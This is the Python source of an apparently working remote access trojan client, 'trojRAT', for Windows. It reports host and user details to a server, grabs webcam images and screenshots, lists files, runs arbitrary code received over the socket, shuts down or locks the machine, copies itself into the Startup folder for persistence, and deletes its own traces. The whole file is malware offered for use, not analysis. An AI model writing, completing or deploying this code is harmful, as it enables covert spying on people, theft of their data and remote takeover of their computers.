import socket, time, subprocess, os, platform, urllib.request, sys, cv2, pyscreeze, wmi, re, string

try: hostname = socket.gethostname()
except (socket.error, Exception): hostname = "UNKNOWN"

try: username = os.environ["USERNAME"]
except (OSError, Exception): username = "UNKNOWN"

try: IP = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); IP.connect(("8.8.8.8", 80))
except (socket.error, Exception): IP = "UNKNOWN"

try: OperatingSystem = platform.system() + " " + platform.release()
except (OSError, Exception): OperatingSystem = "UNKNOWN"

try: External_IP = urllib.request.urlopen("https://ident.me").read()
except (urllib.error.URLError, Exception): External_IP = "UNKNOWN"

decode_utf8 = lambda data: data.decode("utf-8", errors="replace")
recv = lambda buffer: trojRAT.recv(buffer)
APPDATA = os.environ["APPDATA"]
DIRECTORY = os.path.realpath(__file__).strip("client.pyw")
STARTUP = "C:/Users/{}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/".format(os.environ["USERNAME"])

def CameraModel():
    global model
    c = wmi.WMI()
    wql = "Select * From Win32_USBControllerDevice"
    for item in c.query(wql):
        model = item.Dependent.Caption
        if re.findall("Camera",model):
            return (model)
        
CameraModel()

def ClearLogs():
    if (os.path.exists(APPDATA+"/000.vbs")):
        os.remove(APPDATA+"/000.vbs")
    else: pass
    
    if (os.path.exists(APPDATA+"/webcam.png")):
        os.remove(APPDATA+"/webcam.png")
    else: pass
    
    if (os.path.exists(APPDATA+"/screenshot.png")):
        os.remove(APPDATA+"/screenshot.png")
    else: pass
    
def DeleteProgram():
    VBS_WRITE_FILE = "path = \""+DIRECTORY+"client.exe\"\npath2 = \""+STARTUP+"client.exe\"\npath3 = \""+APPDATA+"\del.vbs\"\n" + \
                     "Set del = CreateObject(\"Scripting.FileSystemObject\")\nIf (del.FileExists(path)) Then\ndel.DeleteFile(path)" + \
                     "\nEnd If\nIf (del.FileExists(path2)) Then\ndel.DeleteFile(path2)\nEnd If\nIf (del.FileExists(path3)) Then" + \
                     "\ndel.DeleteFile(path3)\nElse\nEnd If"
    VBS_DELETE_PROGRAM = open(APPDATA+"/del.vbs", "w")
    VBS_DELETE_PROGRAM.write(VBS_WRITE_FILE)
    VBS_DELETE_PROGRAM.close()
    subprocess.Popen(["cscript", APPDATA+"/del.vbs"], shell=True)

def ServerConnection():
    global trojRAT
    while (True):
        try:
            trojRAT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            trojRAT.connect(("0.0.0.0", 5250))
        except (socket.error, Exception):
            time.sleep(1)
        else: break
        
    DATA = IP.getsockname()[0]
    trojRAT.send(DATA.encode())
    
ServerConnection()

def MessageBox():
    message = trojRAT.recv(1024).decode()
    VBS_MSG = open(APPDATA+"/000.vbs", "w")
    VBS_MSG.write("Msgbox \"" + message + "\", vbInformation, \"[Message]\"")
    VBS_MSG.close()
    subprocess.Popen(["cscript", APPDATA+"/000.vbs"], shell=True)
    trojRAT.send("[Message Sent]".encode())
    
def SystemInformation():
    system = "[Computer]: <" + hostname + ">\n[Username]: <" + username + ">\n[IP Address]: <"+ IP.getsockname()[0] + ">\n[System]: <" + \
             OperatingSystem + ">\n[External IP]: <" + External_IP.decode() + ">"
    trojRAT.send(system.encode())
    
def Webcam():
    try:
        camera = cv2.VideoCapture(0)
        return_value, image = camera.read()
        cv2.imwrite(APPDATA+"/webcam.png", image)
        del(camera)
        trojRAT.send("\n[+] Model: (".encode() + model.encode() + ")\n[+] Webcam-Shot Captured Successfully\n".encode())
        objWebcam = open(APPDATA+"/webcam.png", "rb")
        trojRAT.send(objWebcam.read())
        objWebcam.close()
    except (cv2.error, Exception):
        trojRAT.send("[-] No Webcam Detected\n".encode())
        trojRAT.send("@#$@#$@#$@#$".encode())
        
def Screenshot():
    try:
        pyscreeze.screenshot(APPDATA+"/screenshot.png")
        trojRAT.send("[+] Image Captured\n".encode())
        objScreenshot = open(APPDATA+"/screenshot.png", "rb")
        trojRAT.send(objScreenshot.read())
        objScreenshot.close()
    except Exception:
        trojRAT.send("[-] Error Capturing Image\n".encode())
        trojRAT.send("@#$@#$@#$@#$".encode())
        
def ViewFiles(DriveChars):
    drives = ["[%s: - Drive]" % d for d in string.ascii_uppercase if os.path.exists("%s:" % d)]
    trojRAT.send("\n".join(drives).encode())
    
    requested_dir = trojRAT.recv(1024).decode()
    if (os.path.exists(requested_dir) == True):
        trojRAT.send("\n[Files]\n\n".encode() + "\n".join(os.listdir(requested_dir)).encode())
    else:
        trojRAT.send("(Invalid Directory)".encode())
        
def ExecuteServerCode():
    EXECUTE_CODE = trojRAT.recv(4096).decode()
    try:
        exec(EXECUTE_CODE)
        trojRAT.send("[Successfully Executed]".encode())
        return
    except SyntaxError as e1:
        trojRAT.send("[Syntax Error]: ".encode() + str(e1).encode())
    except NameError as e2:
        trojRAT.send("[Name Error]: ".encode() + str(e2).encode())
    except TypeError as e3:
        trojRAT.send("[Type Error]: ".encode() + str(e3).encode())
    except Exception as UnknownError:
        trojRAT.send("[Unknown Error]: ".encode() + str(UnknownError).encode())

try:
    shutil.copyfile("client.exe", "C:/Users/{}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/client.exe".format(os.environ["USERNAME"]))
except (FileNotFoundError, Exception):
    pass
       
while (True):
    try:
        ServerData = recv(1024); ServerData = decode_utf8(ServerData)
        if (ServerData == "delete-program"):
            ClearLogs(); trojRAT.close(); DeleteProgram(); sys.exit(0)
        elif (ServerData == "append-connection"):
            ClearLogs(); trojRAT.close(); del (trojRAT); ServerConnection()
        elif (ServerData == "message-box"):
            MessageBox()
        elif (ServerData == "get-sys"):
            SystemInformation()
        elif (ServerData == "activate-webcam"):
            Webcam()
        elif (ServerData == "capture-screen"):
            Screenshot()
        elif (ServerData == "shutdown-pc"):
            trojRAT.send("[Shutting Down PC]".encode()); os.system("shutdown /p")
        elif (ServerData == "restart-pc"):
            trojRAT.send("[Restarting PC]".encode()); os.system("shutdown /r")
        elif (ServerData == "lock-pc"):
            trojRAT.send("[Locking PC]".encode()); os.system("rundll32.exe user32.dll,LockWorkStation")
        elif (ServerData == "current-directory"):
            trojRAT.send(os.getcwd().encode())
        elif (ServerData == "view-files"):
            ViewFiles(DriveChars="ABCDEFGHIJKLMNOPQRSTUVWXYZ")
        elif (ServerData == "execute-code"):
            ExecuteServerCode()
            
    except (socket.error, Exception):
        trojRAT.close()
        del (trojRAT)
        ServerConnection()